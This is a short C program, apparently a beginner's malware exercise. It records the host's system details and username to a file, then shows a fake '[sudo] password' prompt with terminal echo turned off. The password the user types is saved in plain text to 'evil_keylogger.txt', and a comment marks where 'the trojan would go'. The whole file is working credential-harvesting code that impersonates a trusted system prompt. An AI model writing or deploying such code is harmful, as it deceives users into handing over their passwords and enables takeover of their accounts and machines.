#include <stdio.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <pwd.h>
#include <termios.h>
#include <string.h>

void hidden_input(char *buffer, size_t size){ // I used a tutorial 
    struct termios oldt, newt;

    // turn echoing off
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ECHO); //disables echo flag
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    // reads input
    fgets(buffer, size, stdin);
    //rm's new line char if there
    buffer[strcspn(buffer, "\n")] = '\0';
    // restores terminal
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
}
const char *get_username(){
    struct passwd *pw = getpwuid(getuid());
    return pw ? pw->pw_name : "unkown";
}
void sys_info(FILE *fp){ // 'void' so it doesnt need a value
        struct utsname sysinfo; // stores variables in sysinfo as a dict, so -> sysinfo.****
        if (uname(&sysinfo) == 0) { // to check is uname exists
            fprintf(fp, "System: %s\n", sysinfo.sysname); // '%s' to tell it whats coming is a string
            fprintf(fp, "name: %s\n", sysinfo.nodename); // a node is just a specific host
            fprintf(fp, "release: %s\n", sysinfo.release);
            fprintf(fp, "version: %s\n", sysinfo.version);
            fprintf(fp, "machine: %s\n", sysinfo.machine);
            fprintf(fp, "username: %s\n", get_username());
            fflush(fp);
        }
        
        char input[50];
        printf("[sudo] password for %s%s ", get_username(), ":");
        fflush(stdout); //force prompt befor input
        hidden_input(input, sizeof(input));
        printf("\n");
        //scanf("%49s", input); // 49 to avoid buffer overflow
        
        FILE *log = fopen("evil_keylogger.txt", "w"); 
        if (log) {
            fprintf(log, "your password is: %s\n", input);
            fclose(log);
        }
        
        // the trojan would go here !!!!
    }
int main() {
    FILE *fp = fopen("sysinfo.txt", "w");
    if (fp == NULL) {
        perror("failed to open sysinfo.txt");
        return 1;
    }
    sys_info(fp);
    fclose(fp);
    return 0;
}